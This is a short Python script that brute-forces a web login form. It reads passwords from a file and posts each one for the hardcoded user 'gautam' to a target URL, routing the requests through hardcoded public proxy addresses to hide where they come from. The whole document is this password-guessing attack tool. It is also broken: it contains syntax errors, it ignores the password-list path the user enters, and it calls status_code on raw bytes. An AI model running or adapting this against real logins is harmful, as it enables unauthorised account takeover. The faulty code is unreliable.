import requests
if(y in input(' Use default proxy list? (y/n): ')) 
proxies = {
    "http": "43.239.155.130:32650",
    "https": "186.159.6.163:1994"
}
psd = []
a_url = input("Testing URL:" )
password_list_file = input("Password list path: ")
with open('psl.txt', 'r') as f:
    for line in f:
        psd.append(line.strip())
i = 0
while i < len(psd):

    params = {
        'user_name': 'gautam',
        'user_pass': psd[i]
    }
    response = requests.post(a_url, params=params,proxies=proxies, allow_redirects=True)
    response = response.content.
    if response.status_code == 200:
        print('REQUEST-POSTED !')
        print(response.content)
    elif response.status_code == 301 or response.status_code == 302:
        print('Redirect')
        print(response.headers['Location'])
    else:
        print('Error')
        print(response.status_code)
    i = i+1
 
